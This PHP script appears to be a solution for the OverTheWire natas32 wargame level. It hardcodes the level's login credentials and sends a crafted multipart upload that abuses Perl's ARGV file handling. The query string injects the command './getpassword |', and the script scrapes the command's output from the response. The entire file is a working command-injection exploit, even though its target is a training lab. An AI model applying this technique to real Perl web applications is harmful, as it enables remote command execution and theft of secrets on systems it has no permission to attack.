<?php
include_once "./functions.php";
$boundary = "----WebKitFormBoundaryFgVNNE987xWnwuo7";
$eol = "\r\n";
$bodyData = "";
$bodyData .= "--".$boundary.$eol;
$bodyData .= "Content-Disposition: form-data; name=\"file\";".$eol;
$bodyData .= "Content-Type: text/plain".$eol.$eol;
$bodyData .= "ARGV".$eol;
$bodyData .= "--".$boundary.$eol;
$bodyData .= "Content-Disposition: form-data; name=\"file\"; filename=\"addresses.csv\"".$eol;
$bodyData .= "Content-Type: text/csv".$eol.$eol;
$bodyData .= "abcde".$eol;
$bodyData .= "--".$boundary.$eol;
$bodyData .= "Content-Disposition: form-data; name=\"submit\"".$eol.$eol;
$bodyData .= "Upload".$eol;
$bodyData .= "--".$boundary."--";
$url = "http://natas32.natas.labs.overthewire.org/index.pl?%2E%2Fgetpassword%20%7C";
//$url = "http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20%7C";
$ch = curl_init ($url);
curl_setopt($ch, CURLOPT_USERPWD,"natas32:Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G");  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Content-Type: multipart/form-data; boundary={$boundary}",
    "Content-Length: " . strlen($bodyData)
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, $bodyData);
$output = curl_exec($ch);
curl_close($ch);
echo get_string_between($output,"<table class=\"sortable table table-hover table-striped\"><tr><th>","</th></tr></table><div id=\"viewsource\">");

?>